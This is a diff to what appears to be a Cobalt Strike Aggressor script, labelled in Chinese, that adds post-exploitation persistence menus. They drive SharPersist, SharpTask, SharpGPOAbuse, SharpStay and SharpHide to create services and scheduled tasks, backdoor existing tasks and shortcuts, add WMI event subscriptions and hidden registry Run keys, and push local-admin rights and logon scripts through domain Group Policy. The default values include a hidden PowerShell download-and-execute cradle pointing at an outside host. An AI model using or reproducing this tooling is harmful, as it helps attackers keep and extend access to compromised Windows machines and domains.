@@ -2,7 +2,9 @@
 #                            #
 #                            #
 #                            #
-#       Xway.cn@panda        #
+#       xway.cn@panda8       #
+#       secquan.org@panda8   #
+#		t00ls.com@panda8     #
 #                            #
 #                            #
 #                            #
@@ -13,7 +15,7 @@ menu "权限维持" {
 					item "无文件执行命令" {
 			$bid = $1['@'];
 			$dialog = dialog("Telemetry", %(command => "",bid => $bid), &Telemetry_cmd);
-			dialog_description($dialog, "输入cmd命令，cmd /s 后面的内容，执行方式：Telemetry.exe install /command:calc");
+			dialog_description($dialog, "输入cmd命令，cmd /c 后面的内容，执行方式：Telemetry.exe install /command:calc");
 			drow_text($dialog, "command", "command:  ");	
             dbutton_action($dialog, "运行");
 			dialog_show($dialog);
@@ -38,7 +40,244 @@ sub Telemetry_url {
 		
 		}
 			
+menu "SharPersist" {		
+			item "创建服务" {
+			$bid = $1['@'];
+			$dialog = dialog("SharPersist", %(payload => "C:\\Windows\\Temp\\payload.exe",service_name => "Some Service",bid => $bid), &SharPersist_service);
+			dialog_description($dialog, "创建服务，指定payload地址。");
+			drow_text($dialog, "payload", "payload:  ");	
+			drow_text($dialog, "service_name", "service name:  ");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub SharPersist_service {
+	$arg = join('', @("-t service -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c $3['payload']\" -n \"$3['service_name']\" -m add"));
+	bexecute_assembly($bid, script_resource("/script/SharPersist.exe"), $arg);
+}
 
+                item "启动服务"{
+                    $bid = $1['@'];
+                    $Dialog = dialog("Registration service",%(SerName => "WindowsUpdate",bid => $bid),&service_start);
+                    dialog_description($Dialog, "启动已创建的服务。");
+                    drow_text($Dialog, "SerName", "Service Name: ");
+                    dbutton_action($Dialog, "运行");
+                    dialog_show($Dialog);
+                }
+sub service_start{
+    local('$Name');
+    $Name = $3['SerName'];
+    bshell($bid, "sc config \" $+ $Name\" start= auto&&net start  $+ $Name");
+}
+
+			item "计划任务" {
+			$bid = $1['@'];
+			$dialog = dialog("SharPersist", %(payload => "C:\\Windows\\Temp\\payload.exe",schtask_name => "Some Service",schtask_time => "hourly",bid => $bid), &SharPersist_schtask);
+			drow_text($dialog, "payload", "payload:  ");		
+			drow_text($dialog, "schtask_name", "schtask name:  ");
+			drow_combobox($dialog, "schtask_time", "schtask time:", @("hourly","daily","logon"));
+			dialog_description($dialog, "创建计划任务。");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub SharPersist_schtask {
+	$arg = join('', @("-t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c $3['payload']\" -n \"$3['schtask_name']\" -m add -o $3['schtask_time']"));
+	bexecute_assembly($bid, script_resource("/script/SharPersist.exe"), $arg);
+}
+
+			item "schtaskbackdoor" {
+			$bid = $1['@'];
+			$dialog = dialog("SharPersist", %(payload => "C:\\Windows\\Temp\\payload.exe",schtask_name => "Some Service",bid => $bid), &schtaskbackdoor);
+			drow_text($dialog, "payload", "payload:  ");		
+			drow_text($dialog, "schtask_name", "schtask name:  ");	
+			dialog_description($dialog, "修改存在的计划任务用以创建后门。");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub schtaskbackdoor {
+	$arg = join('', @("-t schtaskbackdoor -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c $3['payload']\" -n \"$3['schtask_name']\" -m add"));
+	bexecute_assembly($bid, script_resource("/script/SharPersist.exe"), $arg);
+}
+
+}
+menu "Sharptask" {
+			item "创建计划任务" {
+			$bid = $1['@'];
+			$dialog = dialog("sharptask", %(host => "Computer|local|hostname|ip",time => "24h:time|12:30",schtasks_name => "Some Service",schtasks_description => "Some Service",filepath => "C:\\Windows\\Temp\\payload.exe",bid => $bid), &sharptask_add);
+			drow_text($dialog, "host", "host:  ");		
+			drow_text($dialog, "time", "time:  ");
+			drow_text($dialog, "schtasks_name", "schtasks_name:  ");
+			drow_text($dialog, "schtasks_description", "schtasks_description:  ");
+			drow_text($dialog, "filepath", "filepath:  ");	
+			dialog_description($dialog, "创建计划任务");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub sharptask_add {
+	$arg = join('', @("--AddTask $3['host'] $3['time'] \\ $3['schtasks_name'] \"$3['schtasks_description']\" $3['filepath']"));
+	bexecute_assembly($bid, script_resource("/script/SharpTask.exe"), $arg);
+}
+			item "查看创建的计划任务" {
+			$bid = $1['@'];
+			$dialog = dialog("sharptask", %(host => "Computer|local|hostname|ip",bid => $bid), &sharptask_list);
+			drow_text($dialog, "host", "host:  ");	
+			dialog_description($dialog, "查看创建的计划任务");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub sharptask_list {
+	$arg = join('', @("--ListAll $3['host'] \\"));
+	bexecute_assembly($bid, script_resource("/script/SharpTask.exe"), $arg);
+}
+			item "查看运行中的计划任务" {
+			$bid = $1['@'];
+			$dialog = dialog("sharptask", %(host => "Computer|local|hostname|ip",bid => $bid), &sharptask_running);
+			drow_text($dialog, "host", "host:  ");	
+			dialog_description($dialog, "查看运行中的计划任务");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub sharptask_running {
+	$arg = join('', @("--GetRunning $3['host']"));
+	bexecute_assembly($bid, script_resource("/script/SharpTask.exe"), $arg);
+}
+			item "停止并删除计划任务" {
+			$bid = $1['@'];
+			$dialog = dialog("sharptask", %(host => "Computer|local|hostname|ip",schtasks_name => "test",bid => $bid), &sharptask_stop);
+			drow_text($dialog, "host", "host:  ");	
+			drow_text($dialog, "schtasks_name", "schtasks_name:  ");
+			dialog_description($dialog, "停止并删除计划任务");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub sharptask_stop {
+	$arg = join('', @("--RemoveTask $3['host'] \\ $3['schtasks_name']"));
+	bexecute_assembly($bid, script_resource("/script/SharpTask.exe"), $arg);
+}
+
+}
+
+menu "SharpGPOAbuse(域)" {
+			item "计划任务" {
+			$bid = $1['@'];
+			$dialog = dialog("创建计划任务", %(Taskname => "update",Author => "DOMAIN\Admin",Command => "cmd.exe",Arguments => "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"",GPOName => "Default Server Policy",bid => $bid), &SharpGPOAbuse_task);
+			drow_text($dialog, "Taskname", "Taskname:  ");		
+			drow_text($dialog, "Author", "Author:  ");
+			drow_text($dialog, "Command", "Command:  ");
+			drow_text($dialog, "Arguments", "Arguments:  ");
+			drow_text($dialog, "GPOName", "GPOName:  ");	
+			dialog_description($dialog, "创建计划任务");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub SharpGPOAbuse_task {
+	$arg = join('', @("--AddComputerTask --TaskName \"$3['Taskname']\" --Author $3['Author'] --Command \"$3['Command']\" --Arguments \"$3['Arguments']\" --GPOName \"$3['GPOName']\""));
+	bexecute_assembly($bid, script_resource("/script/SharpGPOAbuse.exe"), $arg);
+}
+
+			item "添加用户权限" {
+			$bid = $1['@'];
+			$dialog = dialog("添加用户权限", %(UserRights => "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight",UserAccount => "bob.smith",GPOName => "Default Server Policy",,bid => $bid), &SharpGPOAbuse_pri);
+			drow_text($dialog, "UserRights", "UserRights:  ");		
+			drow_text($dialog, "UserAccount", "UserAccount:  ");
+			drow_text($dialog, "GPOName", "GPOName:  ");	
+			dialog_description($dialog, "添加用户权限");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub SharpGPOAbuse_pri {
+	$arg = join('', @("--AddUserRights --UserRights \"$3['UserRights']\" --UserAccount $3['UserAccount'] --GPOName \"$3['GPOName']\""));
+	bexecute_assembly($bid, script_resource("/script/SharpGPOAbuse.exe"), $arg);
+}
+
+			item "添加本地管理员" {
+			$bid = $1['@'];
+			$dialog = dialog("添加本地管理员", %(UserAccount => "bob.smith",GPOName => "Default Server Policy",,bid => $bid), &SharpGPOAbuse_admin);	
+			drow_text($dialog, "UserAccount", "UserAccount:  ");
+			drow_text($dialog, "GPOName", "GPOName:  ");	
+			dialog_description($dialog, "添加本地管理员");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub SharpGPOAbuse_admin {
+	$arg = join('', @("--AddLocalAdmin --UserAccount $3['UserAccount'] --GPOName \"$3['GPOName']\""));
+	bexecute_assembly($bid, script_resource("/script/SharpGPOAbuse.exe"), $arg);
+}
+
+			item "配置用户或计算机登录脚本" {
+			$bid = $1['@'];
+			$dialog = dialog("配置用户或计算机登录脚本", %(ScriptName => "StartupScript.bat",ScriptContents => "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"",GPOName => "Default Server Policy",bid => $bid), &SharpGPOAbuse_admin);	
+			drow_text($dialog, "ScriptName", "ScriptName:  ");
+			drow_text($dialog, "ScriptContents", "ScriptContents:  ");	
+			drow_text($dialog, "GPOName", "GPOName:  ");	
+			dialog_description($dialog, "配置用户或计算机登录脚本");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub SharpGPOAbuse_admin {
+	$arg = join('', @("--AddUserScript --ScriptName $3['ScriptName'] --ScriptContents \"$3['ScriptContents']\" --GPOName \"$3['GPOName']\""));
+	bexecute_assembly($bid, script_resource("/script/SharpGPOAbuse.exe"), $arg);
+}
+
+}
+
+menu "Sharpstay" {
+			item "创建服务" {
+			$bid = $1['@'];
+			$dialog = dialog("CreateService", %(servicename => "Debug",command => "C:\\Windows\\temp\\payload.exe",bid => $bid), &stay_creatservice);
+			drow_text($dialog, "servicename", "servicename:  ");	
+			drow_text($dialog, "command", "command:  ");
+			dialog_description($dialog, "创建服务");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub stay_creatservice {
+	$arg = join('', @("action=CreateService servicename=$3['servicename'] command=\"$3['command']\""));
+	bexecute_assembly($bid, script_resource("/script/SharpStay.exe"), $arg);
+}
+			item "WMI事件订阅" {
+			$bid = $1['@'];
+			$dialog = dialog("WMIEventSub", %(command => "C:\\Windows\\temp\\payload.exe",eventname => "Debug",attime => "startup",bid => $bid), &stay_wmi);
+			drow_text($dialog, "command", "command:  ");	
+			drow_text($dialog, "eventname", "eventname:  ");
+			drow_text($dialog, "attime", "attime:  ");
+			dialog_description($dialog, "WMI事件订阅");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub stay_wmi {
+	$arg = join('', @("action=WMIEventSub command=\"$3['command']\" eventname=$3['eventname'] attime=$3['attime'] "));
+	bexecute_assembly($bid, script_resource("/script/SharpStay.exe"), $arg);
+}
+			item "创建快捷方式" {
+			$bid = $1['@'];
+			$dialog = dialog("NewLNK", %(filepath => "C:\\users\\admin\\desktop",lnkname => "Notepad.lnk",lnktarget => "C:\\Windows\\temp\\payload.exe",lnkicon => "C:\\Windows\\system32\\notepad.exe",bid => $bid), &stay_NewLNK);
+			drow_text($dialog, "filepath", "filepath:  ");	
+			drow_text($dialog, "lnkname", "lnkname:  ");
+			drow_text($dialog, "lnktarget", "lnktarget:  ");
+			drow_text($dialog, "lnkicon", "lnkicon:  ");
+			dialog_description($dialog, "创建快捷方式");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub stay_NewLNK {
+	$arg = join('', @("action=NewLNK filepath=\"$3['filepath']\" lnkname=\"$3['lnkname']\" lnktarget=\"$3['lnktarget']\" lnkicon=\"$3['lnkicon']\" "));
+	bexecute_assembly($bid, script_resource("/script/SharpStay.exe"), $arg);
+}
+			item "修改快捷方式" {
+			$bid = $1['@'];
+			$dialog = dialog("BackdoorLNK", %(command => "C:\\Windows\\temp\\fun.exe",lnkpath => "C:\\users\\user\\desktop\\Excel.lnk",bid => $bid), &stay_BackdoorLNK);
+			drow_text($dialog, "command", "command:  ");	
+			drow_text($dialog, "lnkpath", "lnkpath:  ");
+			dialog_description($dialog, "修改存在的快捷方式");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub stay_BackdoorLNK {
+	$arg = join('', @("action=BackdoorLNK command=\"$3['command']\" lnkpath=\"$3['lnkpath']\""));
+	bexecute_assembly($bid, script_resource("/script/SharpStay.exe"), $arg);
+}
+
+}
 
 	item "CertUtil Web Delivery" {
 		local('$dialog %defaults');
@@ -169,9 +408,9 @@ sub InstallService{
     local('$Name $Path');
     $Name = $3['SerName'];
     $Path = replace($3['Path'], "\"", "");
-    bshell($bid, "sc create \" $+ $Name\" binpath= \"cmd /c start \" $+ $Path\"\"&&sc config \" $+ $Name\" start= auto&&net start   $+ $Name");
+    bshell($bid, "sc create \" $+ $Name\" binpath= \"cmd /c start \" $+ $Path\"\"&&sc config \" $+ $Name\" start= auto&&net start  $+ $Name");
 }
-			item "SharpSQLTools" {
+			item "命令行版SQLTools" {
 			$bid = $1['@'];
 			$dialog = dialog("SharpSQLTools", %(host => "",username => "",password => "",type => "xp",cmd => "whoami",enable => "None",bid => $bid), &SharpSQLTools);
 			dialog_description($dialog, "命令行版SQLTools");
@@ -195,9 +434,54 @@ sub SharpSQLTools {
 		bexecute_assembly($bid, script_resource("/script/SharpSQLTools.exe"), $arg);
 		}
 }		
-		
-		
-		
+
+			item "RegAuto"{
+				$bid = $1;
+				$dialog = dialog("RegAuto", %(name => "test",filepath => "C:\\Windows\\Temp\\123.exe",bid => $bid), &RegAuto_ladon);
+				dialog_description($dialog, "添加注册表Run启动项");
+				drow_text($dialog, "name", "name:  ");
+				drow_text($dialog, "filepath", "filepath:  ");				
+				dbutton_action($dialog, "运行");
+				dialog_show($dialog);
+        }
+sub RegAuto_ladon {
+	$arg = join(' ', @("RegAuto",$3['name'],$3['filepath']));
+	bexecute_assembly($bid, script_resource("/script/Ladon.exe"), $arg);
+}	
+
+menu "SharpHide" {
+			item "RegAuto"{
+				$bid = $1;
+				$dialog = dialog("SharpHide-RegAuto", %(filepath => "\"C:\\Windows\\Temp\\123.exe\"",bid => $bid), &SharpHide_RegAuto);
+				dialog_description($dialog, "添加注册表Run启动项,开机启动");
+				drow_text($dialog, "filepath", "filepath:  ");				
+				dbutton_action($dialog, "运行");
+				dialog_show($dialog);
+        }
+sub SharpHide_RegAuto {
+	$arg = join('', @("action=create keyvalue=",$3['filepath']));
+	bexecute_assembly($bid, script_resource("/script/SharpHide.exe"), $arg);
+}	
+
+			item "RegAuto-arg"{
+				$bid = $1;
+				$dialog = dialog("SharpHide-RegAuto", %(filepath => "\"C:\\Windows\\Temp\\123.exe\"",arguments => "arg1 arg2",bid => $bid), &SharpHide_RegAuto_arg);
+				dialog_description($dialog, "使用参数创建隐藏的注册表（运行）键,开机启动");
+				drow_text($dialog, "filepath", "filepath:  ");	
+				drow_text($dialog, "arguments", "arguments:  ");
+				dbutton_action($dialog, "运行");
+				dialog_show($dialog);
+        }
+sub SharpHide_RegAuto_arg {
+	$arg = join(' ', @("action=create keyvalue=",$3['filepath'], $3['arguments']));
+	bexecute_assembly($bid, script_resource("/script/SharpHide.exe"), $arg);
+}	
+			item "delete"{	
+			bexecute_assembly($1, script_resource("/script/SharpHide.exe"), "action=delete");
+			}
+	}	
+
+
 		}
 
 	
